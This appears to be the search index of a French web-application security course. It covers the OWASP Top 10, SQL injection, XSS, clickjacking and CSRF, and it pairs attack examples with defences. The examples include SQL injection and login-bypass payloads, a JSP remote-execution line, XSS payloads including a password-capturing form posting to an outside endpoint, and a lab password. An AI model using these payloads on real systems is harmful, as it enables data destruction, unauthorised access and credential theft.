var suggestions=document.getElementById("suggestions"),search=document.getElementById("search");search!==null&&document.addEventListener("keydown",inputFocus);function inputFocus(e){e.ctrlKey&&e.key==="/"&&(e.preventDefault(),search.focus()),e.key==="Escape"&&(search.blur(),suggestions.classList.add("d-none"))}document.addEventListener("click",function(e){var t=suggestions.contains(e.target);t||suggestions.classList.add("d-none")}),document.addEventListener("keydown",suggestionFocus);function suggestionFocus(n){const s=suggestions.classList.contains("d-none");if(s)return;const e=[...suggestions.querySelectorAll("a")];if(e.length===0)return;const t=e.indexOf(document.activeElement);if(n.key==="ArrowUp"){n.preventDefault();const s=t>0?t-1:0;e[s].focus()}else if(n.key==="ArrowDown"){n.preventDefault();const s=t+1<e.length?t+1:t;e[s].focus()}}(function(){var e=new FlexSearch.Document({tokenize:"forward",cache:100,document:{id:"id",store:["href","title","description"],index:["title","description","content"]}});e.add({id:0,href:"/docs/authentification/",title:"Authentification",description:"",content:""}).add({id:1,href:"/docs/https/",title:"Https",description:"",content:""}).add({id:2,href:"/docs/failles/",title:"Failles applicatives",description:"",content:""}).add({id:3,href:"/docs/intro/",title:"Introduction",description:"",content:""}).add({id:4,href:"/docs/intro/grands-principes/",title:"Les grands principes de la sÃ©curitÃ©",description:"Qu\u0026rsquo;est ce que \u0026ldquo;la sÃ©curitÃ© infromatique\u0026rdquo; ??\nou De quoi va-t-on parler ?\nDes grands principes (nombre et portÃ©e variant selon les sources)\n DisponibilitÃ© IntÃ©gritÃ© ConfidentialitÃ© Authentification TraÃ§abilitÃ© Non rÃ©pudiation   La premiÃ¨re partie de cette formation prÃ©sentera des failles applicatives pouvant impacter un ou plusieurs de ces principes.\n DisponibilitÃ© #  S\u0026rsquo;assurer que les utilisateurs peuvent accÃ©der au service sur les plages d\u0026rsquo;utilisation prÃ©vues et en respectant des temps de rÃ©ponse attendus Du ressort des ops\u0026hellip;  Haute disponibilitÃ© via plusieurs couloirs (scalabilitÃ© horizontale) Ajutement mÃ©moire/CPU (scalabilitÃ© verticale) Supervision   \u0026hellip; et des devs  Penser les limites de chaque traitement, contraindre l\u0026rsquo;utilisateur Ã‰viter les traitements saturant la machines en une requÃªte\u0026hellip; Suivre les mises Ã  jour des librairies    IntÃ©gritÃ© #  S\u0026rsquo;assurer que l\u0026rsquo;information envoyÃ©e Ã  l\u0026rsquo;utilisateur est celle qu\u0026rsquo;il reÃ§oit Solutions pour considÃ©rations techniques (rÃ©seau perturbÃ©, perte de paquet, \u0026hellip;)  Ajout de mÃ©canismes de controles : TCP avec numÃ©ro de sÃ©quence et checksum Notions de fonctions de hachage   MAIS : ne permet pas de se prÃ©munir d\u0026rsquo;une altÃ©ration volontaire des donnÃ©es par un attaquant  Ajouter un hash\u0026hellip; mais non modifiable facilement\u0026hellip; donc ne transitant pas en clair    ConfidentialitÃ© #  S\u0026rsquo;assurer que seul l\u0026rsquo;emmetteur et le rÃ©cepteur d\u0026rsquo;une information peuvent la consulter S\u0026rsquo;assurer de l\u0026rsquo;identitÃ© du serveur distant NÃ©cessitÃ© de chiffrer les donnÃ©es TLS surchargÃ© aux principaux protocoles (HTTPS, FTPS, etc.",content:"Qu\u0026rsquo;est ce que \u0026ldquo;la sÃ©curitÃ© infromatique\u0026rdquo; ??\nou De quoi va-t-on parler ?\nDes grands principes (nombre et portÃ©e variant selon les sources)\n DisponibilitÃ© IntÃ©gritÃ© ConfidentialitÃ© Authentification TraÃ§abilitÃ© Non rÃ©pudiation   La premiÃ¨re partie de cette formation prÃ©sentera des failles applicatives pouvant impacter un ou plusieurs de ces principes.\n DisponibilitÃ© #  S\u0026rsquo;assurer que les utilisateurs peuvent accÃ©der au service sur les plages d\u0026rsquo;utilisation prÃ©vues et en respectant des temps de rÃ©ponse attendus Du ressort des ops\u0026hellip;  Haute disponibilitÃ© via plusieurs couloirs (scalabilitÃ© horizontale) Ajutement mÃ©moire/CPU (scalabilitÃ© verticale) Supervision   \u0026hellip; et des devs  Penser les limites de chaque traitement, contraindre l\u0026rsquo;utilisateur Ã‰viter les traitements saturant la machines en une requÃªte\u0026hellip; Suivre les mises Ã  jour des librairies    IntÃ©gritÃ© #  S\u0026rsquo;assurer que l\u0026rsquo;information envoyÃ©e Ã  l\u0026rsquo;utilisateur est celle qu\u0026rsquo;il reÃ§oit Solutions pour considÃ©rations techniques (rÃ©seau perturbÃ©, perte de paquet, \u0026hellip;)  Ajout de mÃ©canismes de controles : TCP avec numÃ©ro de sÃ©quence et checksum Notions de fonctions de hachage   MAIS : ne permet pas de se prÃ©munir d\u0026rsquo;une altÃ©ration volontaire des donnÃ©es par un attaquant  Ajouter un hash\u0026hellip; mais non modifiable facilement\u0026hellip; donc ne transitant pas en clair    ConfidentialitÃ© #  S\u0026rsquo;assurer que seul l\u0026rsquo;emmetteur et le rÃ©cepteur d\u0026rsquo;une information peuvent la consulter S\u0026rsquo;assurer de l\u0026rsquo;identitÃ© du serveur distant NÃ©cessitÃ© de chiffrer les donnÃ©es TLS surchargÃ© aux principaux protocoles (HTTPS, FTPS, etc.)  ðŸ‘‰  L'intÃ©gritÃ© est trÃ¨s difficilement dissociable de la confidentialitÃ©  Une appli sans HTTPS n'est plus envisageable aujourd'hui    Un kit de survie du HTTPS sera abordÃ© dans la partie HTTPS de la formation. Il s\u0026rsquo;agit de connaitre les principes de base, afin de pouvoir aprÃ©hender les principales erreurs relative Ã  une configuration HTTPS.\n Authentification #  Une opÃ©ration n\u0026rsquo;est accessible qu\u0026rsquo;Ã  ceux qui sont censÃ© rÃ©aliser l\u0026rsquo;opÃ©ration Prouver qu\u0026rsquo;on est celui qu\u0026rsquo;on dÃ©clare Ãªtre  On parle de facteurs d\u0026rsquo;authentification pour chaque preuve que l\u0026rsquo;on peut aborder\n Ce que je sais : mot de passe Ce que je possÃ¨de : certificat, carte Ã  puce, badge Ce que je suis : empreinte digitale, rÃ©tinienne   Une grande partie de cette formation se focalise sur les enjeux et les moyens concret de mettre en place une authentification sur son application\n TraÃ§abilitÃ© #  ÃŠtre capable de savoir ce qui s\u0026rsquo;est passÃ© sur un serveur et par qui Avoir un systÃ¨me de logs,\u0026hellip; Connaitre son sytÃ¨me de logs !!! Avoirs des moyens efficace de rechercher une information dans ses logs   Ne sera pas abordÃ© dans cette formation, mais reste une Ã©tape indispensable Ã  la reflexion de la sÃ©curitÃ© de son application. Le jour on aura besoin de savoir ce qu\u0026rsquo;il s\u0026rsquo;est passÃ©, ce sera trop tard pour y penser\u0026hellip;\n Non rÃ©pudiation #  Un utilisateur ne peut nier une action effectuÃ©e \u0026ldquo;Signature d\u0026rsquo;un contrat\u0026rdquo; Principe de la signature Ã©lectronique   Hors scope de cette formation\n Pour aller plus loin #  Auto-formation aux grands concepts de la sÃ©curitÃ© par l\u0026rsquo;ANSSI : https://www.secnumacademie.gouv.fr/  "}).add({id:5,href:"/docs/failles/intro/",title:"Qu'est ce qu'une faille applicative ?",description:"Demandons l\u0026rsquo;avis Ã  Wikipedia :   Une vulnÃ©rabilitÃ© ou faille est une faiblesse dans un systÃ¨me informatique permettant Ã  un attaquant de porter atteinte Ã  l\u0026rsquo;intÃ©gritÃ© de ce systÃ¨me, c\u0026rsquo;est-Ã -dire Ã  son fonctionnement normal, Ã  la confidentialitÃ© ou Ã  l\u0026rsquo;intÃ©gritÃ© des donnÃ©es qu\u0026rsquo;il contient\n  Un avis ChatGpt ?   Une faille applicative est une vulnÃ©rabilitÃ© dans une application informatique qui permet Ã  un attaquant d\u0026rsquo;exploiter une faiblesse dans le code ou la configuration de l\u0026rsquo;application pour obtenir un accÃ¨s non autorisÃ©, modifier des donnÃ©es ou exÃ©cuter des actions malveillantes.",content:" Demandons l\u0026rsquo;avis Ã  Wikipedia :   Une vulnÃ©rabilitÃ© ou faille est une faiblesse dans un systÃ¨me informatique permettant Ã  un attaquant de porter atteinte Ã  l\u0026rsquo;intÃ©gritÃ© de ce systÃ¨me, c\u0026rsquo;est-Ã -dire Ã  son fonctionnement normal, Ã  la confidentialitÃ© ou Ã  l\u0026rsquo;intÃ©gritÃ© des donnÃ©es qu\u0026rsquo;il contient\n  Un avis ChatGpt ?   Une faille applicative est une vulnÃ©rabilitÃ© dans une application informatique qui permet Ã  un attaquant d\u0026rsquo;exploiter une faiblesse dans le code ou la configuration de l\u0026rsquo;application pour obtenir un accÃ¨s non autorisÃ©, modifier des donnÃ©es ou exÃ©cuter des actions malveillantes.\n  Les failles applicatives peuvent Ãªtre causÃ©es par une mauvaise conception de l\u0026rsquo;application, des erreurs de programmation, des problÃ¨mes de configuration ou des erreurs humaines. Certaines des vulnÃ©rabilitÃ©s les plus courantes comprennent les injections SQL, les attaques de scripts entre sites (XSS), les attaques de falsification de demande intersite (CSRF), les failles d\u0026rsquo;authentification, les failles de contrÃ´le d\u0026rsquo;accÃ¨s, les erreurs de validation de donnÃ©es, etc.\n  Il est important pour les dÃ©veloppeurs et les Ã©quipes de sÃ©curitÃ© informatique de dÃ©tecter et de corriger rapidement les failles applicatives pour Ã©viter que des attaquants ne profitent de ces vulnÃ©rabilitÃ©s. Les tests de sÃ©curitÃ© rÃ©guliers, les examens de code et les audits de sÃ©curitÃ© sont des moyens courants de dÃ©tection et de correction des failles applicatives.\n Grandes catÃ©gories :\n Une erreur de conception ? Une erreur de configuration ? Une erreur de programmation (bug, fonctionnalitÃ© mal implÃ©mentÃ©e) ?  Une erreur de conception ? # Cas 1 :\nSoit une plateforme de rÃ©servation en ligne pour des chambres d\u0026rsquo;hÃ´tel.\nJe propose aux utilisateurs d\u0026rsquo;annuler leurs commandes jusqu\u0026rsquo;Ã  16 h.\nUn concurrent peut facilement pourrir mon hÃ´tel en rÃ©servant toutes les chambres et en les annulant Ã  15h55.\nEst ce que cela fait partie du fonctionnement normal ?\nCas 2 :\nSur mon web service de gestion d\u0026rsquo;annuaire, on peut crÃ©er autant d\u0026rsquo;habilitations que l\u0026rsquo;on veut pour un contact\nAu delÃ  d\u0026rsquo;environ 300 habilitations c\u0026rsquo;est l\u0026rsquo;annuaire qui finit par planter\u0026hellip;\nProblÃ©matiques Ã  la conception :\n S\u0026rsquo;assurer que par design certains processus ne seront pas forcÃ©ment soumis Ã  des instabilitÃ©s ConnaÃ®tre les limites de son systÃ¨me  Une erreur de configuration ? # Quelques exemples :\n L\u0026rsquo;application n\u0026rsquo;est pas proposÃ©e et forcÃ©e en HTTPS Flux trop large en entrÃ©e (par exemple possiblitÃ© de connexion sur ports d\u0026rsquo;administration ou base de donnÃ©es exposÃ©e) Secrets exposÃ©s BibliothÃ¨ques Ã  jour mais avec une configuration permettant de faire n\u0026rsquo;importe quoi (mode.debug=true ou conf.developpement=true) \u0026hellip;  Une erreur de programmation ? #  Son propre code Le code des autres, dit autrement les bibliothÃ¨ques utilisÃ©es : NÃ©cÃ©ssitÃ© de mise Ã  jour rÃ©guliÃ¨re !  Le top 10 des vulnÃ©rabilitÃ©s : OWASP\nhttps://owasp.org/www-project-top-ten/\n A1 : Acceder Ã  une ressource non prÃ©vue :  Mauvaise gestion des droits En forcant un utilisateur privilÃ©giÃ© Ã  cliquer sur l\u0026rsquo;action souhaitÃ©e = XSS y compris injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo; Vol de session : consÃ©quence de XSS et d\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© client\u0026rdquo;   A2 : Ne pas ou mal utiliser un canal chiffrÃ©  Protocoles obsolÃ¨tes, contrÃ´les non effectuÃ©s HTTPS non obligatoire   A3 : Injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo;  Faire Ã©xÃ©cuter du code non prÃ©vu en particulier directement sur la base de donnÃ©es   A4 : Erreur de conception  La meilleure des implÃ©mentations ne corrigera pas   A5 : Erreur de configuration A6 : BibliothÃ¨ques pas Ã  jour (ou utilisation de bibliothÃ¨ques abandonnÃ©es)  Bugs des \u0026ldquo;autres\u0026rdquo;   A7 : Failblesses d\u0026rsquo;authentification  PossibilitÃ© de brute force Mots de passe faibles ou trop standards DÃ©connexions et invalidation de session mal gÃ©rÃ©s   A8 : Non controles d\u0026rsquo;intÃ©gritÃ©  DonnÃ©es entrantes (au run) BibliothÃ¨ques vÃ©rolÃ©es (au build)   A9 : DÃ©faut de tracabilitÃ©  Logs inexploitables Impossible de savoir clairement qui a fait quoi et quand   A10 : Injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo;, vision rÃ©seau  SÃ©curitÃ© en profondeur, cloisonnement rÃ©seau Comptes applicatif Ã  droits limitÃ©s    Une petite typologie d\u0026rsquo;attaque et de protection # Disclaimer : Cette typologie est volontairement trÃ¨s rÃ©ductrice !\nOn diffÃ©renciera par la suite deux grands types d\u0026rsquo;attaque et deux grand types de protection.\nLes attaques directes # L\u0026rsquo;attaquant va directement taper sur le serveur cible.\nLes attaques indirectes # L\u0026rsquo;attaquant va forcer un utilisateur avec les droits requis Ã  faire l\u0026rsquo;action pour lui.\nLes protections actives # On rajoute des entraves sur l\u0026rsquo;accÃ¨s au serveur qui serait clible de l\u0026rsquo;attaque.\nLes protection passives ou dÃ©claratives # Je vais donner Ã  l\u0026rsquo;utilisateur (et notamment au navigateur de l\u0026rsquo;utilisateur !) des rÃ¨gles sur ce Ã  quoi ressemble une requÃªte lÃ©gitime, pour dÃ©tecter et bloquer tout ce qui en diverge.\nIllustration # Pour illustrer, imaginons hors domaine informatique que je suis un vil voleur souhaitant m\u0026rsquo;emparer d\u0026rsquo;un lingot d\u0026rsquo;or dans le coffre fort de M Alphonse Robichu.\nLes attaques directes\n Je pÃ©nÃ¨tre dans la banque, je met un baton de dynamite, le coffre explose, je rÃ©cupÃ¨re le lingot.  Les attaques indirectes\n Je vais voir un prÃ©posÃ© de la banque qui stocke le coffre fort, je sais qu\u0026rsquo;il possÃ¨de une clÃ© admin qui ouvre tous les coffres. Je lui dit que je suis Alphonse Robichu et que je souhaite qu\u0026rsquo;il aille rÃ©cupÃ©rer le lingot pour moi dans le coffre.  Les protections actives\n Je change la structure de mes coffres pour qu\u0026rsquo;ils soient Ã  l\u0026rsquo;Ã©preuve de la dynamite.  On remarquera que cette protection est totalement inefficace sur l\u0026rsquo;attaque \u0026ldquo;indirecte\u0026rdquo; prÃ©cÃ©dente\nLes protection passives\n J\u0026rsquo;explique au prÃ©posÃ© que seul les clients muni d\u0026rsquo;une carte d\u0026rsquo;identitÃ© valide peuvent faire ce genre de demande.  Ma protection ne marche que si j\u0026rsquo;ai confiance dans le respect du processus par mon prÃ©posÃ©\nSynthÃ¨se # Deux grands types de protection\n VÃ©rifier les entrÃ©es utilisateurs ! (SÃ©curitÃ© active) VÃ©rifier que l\u0026rsquo;utilisateur est bien conscient de ses actions :  VÃ©rification d\u0026rsquo;Ã©tat (SÃ©curitÃ© active) Dire au navigateur quelles opÃ©rations sont lÃ©gitimes ou non (SÃ©curitÃ© dÃ©clarative)    S\u0026rsquo;initier aux failles applicatives #  OWASP  Documentation et notamment le OWASP top 10 WebGoat (dÃ©couverte de failles sous forme de cours) Juice Store (challenges)   Natas Root Me  Par ailleurs le CERT-FR est un sytÃ¨me de notification des failles applicatives. Il publie aussi rÃ©guliÃ¨rement des articles de cybersÃ©curitÃ©.\nSurveiller les dÃ©pendances obsolÃ¨tes #  Dependabot (vÃ©rification existance d\u0026rsquo;une nouvelle version) Pour vÃ©rifier vulnÃ©rabilitÃ©s connues : https://owasp.org/www-project-dependency-check/  "}).add({id:6,href:"/docs/failles/sql/",title:"Injections de code (serveur)",description:'L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; #  https://xkcd.com/license.html  Que s\u0026rsquo;est-il passÃ© ?\n var injection = function () { var body = document.getElementsByTagName("body")[0]; var myTxt = document.getElementById("scriptEvil0").value; var displayText; // if (myTxt === "Robert\'); DROP TABLE Students;--"){ if (myTxt.indexOf("\'")  -1) { displayText = "Oui, pour tester une attaque par injection on tente de mettre une \' dans le champ !"; } else { displayText = myTxt + " a Ã©tÃ© ajoutÃ© en base"',content:"L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo; #  https://xkcd.com/license.html  Que s\u0026rsquo;est-il passÃ© ?\n var injection = function () { var body = document.getElementsByTagName(\"body\")[0]; var myTxt = document.getElementById(\"scriptEvil0\").value; var displayText; // if (myTxt === \"Robert'); DROP TABLE Students;--\"){ if (myTxt.indexOf(\"'\")  -1) { displayText = \"Oui, pour tester une attaque par injection on tente de mettre une ' dans le champ !\"; } else { displayText = myTxt + \" a Ã©tÃ© ajoutÃ© en base\"; } myUl = document.getElementById(\"myUl0\"); node = document.createElement(\"LI\"); txt = document.createTextNode(displayText); node.appendChild(txt); myUl.appendChild(node); }   Ã‰cole municipale de Kelkepare # Inscription d\u0026rsquo;un nouvel Ã©lÃ¨ve\nPrÃ©nom : Inscrire l\u0026rsquo;Ã©lÃ¨ve\n  Le code ressemble Ã  Ã§a :\npublic void inscrireEleve(String prenom){ String maRequeteSQL = \u0026quot;INSERT INTO Students VALUES ('\u0026quot; + prenom + \u0026quot;')\u0026quot;; connectionSql.createStatement().executeQuery(maRequeteSQL); }  Si on remplit dans le formulaire Robert'); DROP TABLE Students;-- La requÃ¨te envoyÃ©e au serveur devient :\nINSERT INTO Students VALUES ('Robert'); DROP TABLE Students;--')  Injection SQL\nPourquoi ?\n Consulter des donnÃ©es confidentielles AltÃ©rer la base de donnÃ©es  Attaque DIRECTE\nOn remarque que ce type d\u0026rsquo;attaque se produit quand un langage fait appel Ã  un autre langage. Un code java par exemple lance des requetes sql ou ldap moyennant ces chaines de caracteres.\n\u0026quot;SELECT * FROM USER WHERE identifiant='\u0026quot; + username + \u0026quot;' AND password='\u0026quot; + password + \u0026quot;'\u0026quot;;  Ã  renseigner avec username=robichu et password=' OR '1'='1' -- pour se connecter en tant que M Robichu\nLa sÃ©curitÃ© va donc consister essentiellement Ã  repÃ©rer ces possibles manipulation de la chaÃ®nes, c\u0026rsquo;est Ã  dire repÃ©rer les caracteres spÃ©ciaux du langage cible et les Ã©chapper selon les modes d\u0026rsquo;Ã©chappement du langages.\nOn rÃ©Ã©criera ' OR '1'='1' -- en '' OR ''1''=''1'' --\nProtection ACTIVE\nConcrÃ¨tement, on n\u0026rsquo;est pas les premieres Ã  se dire qu\u0026rsquo;il faut Ã©chapper des caractÃ¨res, il faut s\u0026rsquo;appuyer au maximum sur des bibliotheques Ã©prouvÃ©es. Toujours dans le cas de sql :\n Utiliser des PreparedStatement Mieux, Utiliser des Frameworks qui font le boulot sans que l\u0026rsquo;on gÃ¨re vraiment le sql (hibernate, \u0026hellip;) Des bibliothÃ¨ques que l\u0026rsquo;on garde Ã  jour bien entendu  Un peu de pratique\u0026hellip; # DÃ©couvrons une sÃ©rie challenge disponible sur internet\n Natas 0 (mot de passe de natas0 : natas0) Sur les premiers niveaux, on voit qu\u0026rsquo;une resource cachÃ©e n\u0026rsquo;est jamais cachÃ©e (Digression : robots.txt) et que quelques Ã©lÃ©ments pouvent Ãªtre trÃ¨s facilement manipulÃ©s dans la requÃªte  L\u0026rsquo;injection de code : le retour de la revanche # Quelques niveaux plus tard :\n Natas 12 (mot de passe de natas12 : EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3) Le but est de dÃ©couvrir le mot de passe de natas13 situÃ© dans /etc/natas_webpass/natas13 Hint : passthru est une fonction php permettant d\u0026rsquo;Ã©xÃ©cuter sur le sytÃ¨me du code arbitraire   ExÃ©cution de code sur le serveur\n Mettre un fichier malicieux sur le serveur permettant l\u0026rsquo;Ã©xÃ©cution de code Ã  distance. Ici le code injectÃ© sera du code Ã©xÃ©cutÃ© cÃ´tÃ© serveur (java sur jsp, php)  L\u0026rsquo;injection de code \u0026ldquo;cÃ´tÃ© serveur\u0026rdquo;\n  ExÃ©cution de code sur le serveur au plus prÃ¨s du systÃ¨me\n  Rebond sur le SI possible si :\n flux larges entre les diffÃ©rents serveurs compte Ã©xÃ©cutant le code Ã  haut privilÃ¨ge    Nombreuses possibilitÃ©s : aussi bien des traitements dans l\u0026rsquo;application non prÃ©vus que des opÃ©rations directement sur le systÃ¨me d\u0026rsquo;exploitation\n  Par exemple rÃ©ussir Ã  placer sur le serveur une jsp contenant :\n  \u0026lt;%Runtime.getRuntime().exec(\u0026quot;less /confidentiel/data\u0026quot;);%\u0026gt;   Un langage de programmation lance indirectement des commandes systÃ¨me  SÃ©curitÃ© : #  ContrÃ´ler les entrÃ©es utilisateurs et en particulier pour les fichiers :  le type MIME des entrÃ©es, la cohÃ©rence type attendu et contenu autant que possible l\u0026rsquo;extention de fichier nommÃ© car le serveur et/ou le navigateur peut interprÃ©ter diffÃ©remment un fichier selon son nommage    SÃ©curitÃ© : #  CÃ´tÃ© prod :  \u0026ldquo;chroot\u0026rdquo; des applications ou machines limitÃ© Ã  un traitement utilisateur Ã©xÃ©cutant l\u0026rsquo;application avec droit limitÃ©s (ce n\u0026rsquo;est pas le compte root/admin qui dÃ©marre le tomcat) flux limitÃ©s entre machines    L\u0026rsquo;injection de code : SynthÃ¨se #  Un sujet central : l\u0026rsquo;entrÃ©e untilisateur  Mais qu\u0026rsquo;est ce qu\u0026rsquo;une entrÃ©e utilisateur ?\n RequÃªte et ParamÃ¨tres de requÃªte Corps de requÃªte (contenu des requÃªte POST et PUT) : rÃ©ponse Ã  un formulaire, fichier Cookies Entetes HTTP (Authorization, Location, Host, User-Agent, Referrer, Cookies, CORS, \u0026hellip;)  Controle des chaines entrÃ©es et Ã©chappement de tous les caratÃ¨res interprÃ©tables en html, en sql,\u0026hellip; selon la situation.\nUn dÃ©veloppeur web peut se contenter de surveiller ces entrÃ©es mais en rÃ©alitÃ©, les failles peuvent survenir sur n\u0026rsquo;importe quel bit d\u0026rsquo;un Ã©change rÃ©seau.\nUne attaque rÃ©elle pour illustrer #  Log4Shell Decembre 2021 https://fr.wikipedia.org/wiki/Log4Shell Voir projet exploit Exploiter avec https://canarytokens.org/generate  "}).add({id:7,href:"/docs/failles/injection-client/",title:"Injections de code (client)",description:"Les attaques basÃ©es sur des croisements de domaines",content:"Les attaques basÃ©es sur des croisements de domaines # Objectifs :\n Un utilisateur connectÃ© sur un site lÃ©gitime envoie des donnÃ©es Ã  un site attaquant Un site attaquant force un utilisateur Ã  faire une opÃ©ration non souhaitÃ© sur le site lÃ©gitime  Le clickjacking # Vous avez GagnÃ© Cliquez la\n Vous avez GagnÃ©, regardez mieux Cliquez la\n Les \u0026lt;iframe\u0026gt;\n Principe lÃ©gitime Ã  la base : afficher une page web sur une autre page web Comportements dÃ©tournÃ©s Clickjacking = on cache une iframe par dessus un bouton aparemment lÃ©gitime  \u0026lt;iframe style=\u0026quot;opacity: 0\u0026quot; src=\u0026quot;https://le-site-des-admins\u0026quot;\u0026gt;  XFS Cross Frame Scripting : principe gÃ©nÃ©ral d\u0026rsquo;attaque consistant Ã  injecter le site lÃ©gitime sur le site du pirate via un iframe\nAttaque INDIRECTE\n=\u0026gt; Protection PASSIVE\n on va dire au navigateur que le site n\u0026rsquo;a aucune raison lÃ©gitime d\u0026rsquo;Ãªtre dans une iframe  Des entÃªtes standards existent :  X-Frame-Options:\u0026lt;DENY|SAMEORIGIN|ALLOW-FROM https://example.com/\u0026gt;;   On filtre donc les origines qui ont le droit d\u0026rsquo;afficher l\u0026rsquo;iframe /!\\ Absence d\u0026rsquo;entÃªte = autorisÃ© de n\u0026rsquo;importe quel source    L\u0026rsquo;injection de code\u0026hellip; cÃ´tÃ© client ! #  var fonction = function () { myUl = document.getElementById(\"myUl\"); myTxt = document.getElementById(\"scriptEvil\").value; var node = document.createElement(\"LI\"); node.innerHTML = myTxt; myUl.appendChild(node); }   Ã‰cole municipale de Kelkepare # Inscription d\u0026rsquo;un nouvel Ã©lÃ¨ve\nPrÃ©nom : Inscrire l\u0026rsquo;Ã©lÃ¨ve\n  Et si j\u0026rsquo;Ã©crit dans le formulaire :\n\u0026lt;form action=\u0026quot;https://securite-applicative.free.beeceptor.com\u0026quot; \u0026gt;Entrez votre mot de passe : \u0026lt;input type=\u0026quot;password\u0026quot; name=\u0026quot;password\u0026quot; /\u0026gt;\u0026lt;button type=\u0026quot;submit\u0026quot; formtarget=\u0026quot;_blank\u0026quot;\u0026gt;Me connecter\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt;  Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative\nDÃ©clinable Ã  souhait\u0026hellip;\n\u0026lt;button onclick=\u0026quot;window.location='https://securite-applicative.free.beeceptor.com'\u0026quot; \u0026gt;Continuer\u0026lt;/button\u0026gt;  On peut ainsi forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action\n En le redirigeant sur la page avec des paramÃ¨tres de requete trafiquÃ©s En stockant en base un code qui va Ãªtre rÃ©affichÃ©  On peut ainsi rajouter ce genre de code sur la page de l\u0026rsquo;utilisateur\n\u0026lt;script\u0026gt;document.location=\u0026quot;https://no.domain\u0026quot;\u0026lt;/script\u0026gt;  \u0026lt;script\u0026gt; document.getElementsByTagName(\u0026quot;body\u0026quot;)[0].innerHTML(\u0026quot; \u0026lt;form action='https://no.domain' \u0026gt; \u0026lt;br\u0026gt;Connectez vous !\u0026lt;br\u0026gt; \u0026lt;input type='text' name='email'\u0026gt; \u0026lt;input type='password' name='mot de passe'\u0026gt; \u0026lt;input type='submit' value='Connexion'\u0026gt; \u0026lt;/form\u0026gt; \u0026quot;) \u0026lt;/script\u0026gt;  On parle de XSS (Cross-Site Scripting)\nPourquoi ?\n Vol de donnÃ©es, en particulier des cookies de session (explications) Redirection malveillante  Comment ?\n Consiste Ã  injecter du code et en particulier des script dans une page web (donc Ã©xÃ©cutÃ© par l\u0026rsquo;utilisateur dans son navigateur) L\u0026rsquo;attaquant fournit une requÃªte vers un site lÃ©gitime mais dont le contenu injecte le code L\u0026rsquo;attaquant peut aussi profiter d\u0026rsquo;une non validation des donnÃ©es persistantes (BDD)  Plusieurs types de XSS\n Injection \u0026ldquo;en direct\u0026rdquo; par le serveur, on parle de reflected XSS On l\u0026rsquo;appelle DOM XSS, si elle consiste Ã  modifier le DOM via un script Pire, XSS Stored : le pirate arrive Ã  Ã©crire ce code dans une base de donnÃ©es ou dans un fichier local. Il n\u0026rsquo;a mÃªme plus besoin de fournir un lien trafiquÃ© Ã  l\u0026rsquo;utilisateur.  Attaque INDIRECTE =\u0026gt; Protection PASSIVE .. et un peu ACTIVE\nSÃ©curitÃ© active :\n VÃ©rifier les entrÃ©es utilisateurs ! Echapper caractÃ¨res spÃ©ciaux HTML (utiliser au maximum les sÃ©curitÃ©s internes des framework, sinon des fonctions existent dÃ©jÃ  dans les principaux langages, par exemple ${fn:escapeXml(string)} dans une EL en JSP)  SÃ©curitÃ© passive :\n RÃ©sumÃ© des headers Content Security Policy (CSP) Prez Spec (deprecated) X-XSS-Protection  ComplÃ©ments pour la protection des cookies\n Forcer les cookies Ã  Ãªtre \u0026ldquo;secure\u0026rdquo; (utilisable en https uniquement), \u0026ldquo;httpOnly\u0026rdquo; (non utilisable dans les scripts) PrÃ©cision : il s\u0026rsquo;agit de sÃ©curitÃ© dÃ©clarative dont la mise en oeuvre est Ã  la charge du navigateur  Les attaques CSRF # CSRF = Cross-Site Request Forgery\n  scÃ©nario : Le pirate souhaite effectuer une opÃ©ration en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous Ãªtes authentifiÃ© sur le cible cible, l\u0026rsquo;action s\u0026rsquo;effectue en votre nom. La vulnÃ©rabilitÃ© existe sur les authentifications basÃ©es sur des cookies ou sur des authentifications sso.\n  On ne cherche pas Ã  empÃ©cher une acton malveillante en soi\n  On cherche Ã  empÃ©cher un utilisateur de faire une opÃ©ration lÃ©gitime mais forcÃ©e par le pirate. On veut s\u0026rsquo;assurer que l\u0026rsquo;utilisateur rÃ©alise son opÃ©ration en pleine conscience.\n  Protections :\n  VÃ©rifier les entrÃ©es utilisateurs ?\n  Ici, l\u0026rsquo;action Ã  bloquer est lÃ©gitime\u0026hellip;\n  Faire en sorte qu\u0026rsquo;Ã  chaque appel d\u0026rsquo;un vrai formulaire du site, un jeton Ã  usage unique soit ajoutÃ©. Le serveur pourra ainsi s\u0026rsquo;assurer de la cohÃ©rence de la requÃªte\n  Des bibliothÃ¨ques peuvent aider Ã  cette protection : Spring security, pac4j\n  Il faut alors ajouter dans chaque formulaire le jeton en hidden\n  \u0026lt;form action=\u0026quot;/monActionAdmin\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Faire l'opÃ©ration sensible\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;${_csrf.parameterName}\u0026quot; value=\u0026quot;${_csrf.token}\u0026quot;/\u0026gt; \u0026lt;/form\u0026gt;   Principe tout POST ne contenant pas ce paramÃ¨tre se soldera par une 403 Potentiellement pas nÃ©cessaire sur tout le site Pour lever la protection en spring security:  http.csrf().ignoringAntMatchers(\u0026quot;/saml/**\u0026quot;); // l'ignorer sur certaines url http.csrf().disable(); // l'ignorer complÃ¨tement  La protection CORS # CSRF et applis \u0026ldquo;modernes\u0026rdquo; : Frontend JS + Backend Java\n Pas de formulaire cÃ´tÃ© serveur Des requÃªtes isolÃ©e, pas de cookie mais authentification par jeton Si je sers \u0026ldquo;presque\u0026rdquo; le mÃªme service javascript, si l\u0026rsquo;admin se connecte Ã  mon service, je peux lui faire rÃ©aliser toutes les requÃªtes que je souhaite Protection = vÃ©rifier l\u0026rsquo;url oÃ¹ l\u0026rsquo;admin a rÃ©cupÃ©rÃ© le script  CORS = Cross Over Resource Sharing\nScÃ©nario d\u0026rsquo;attaque 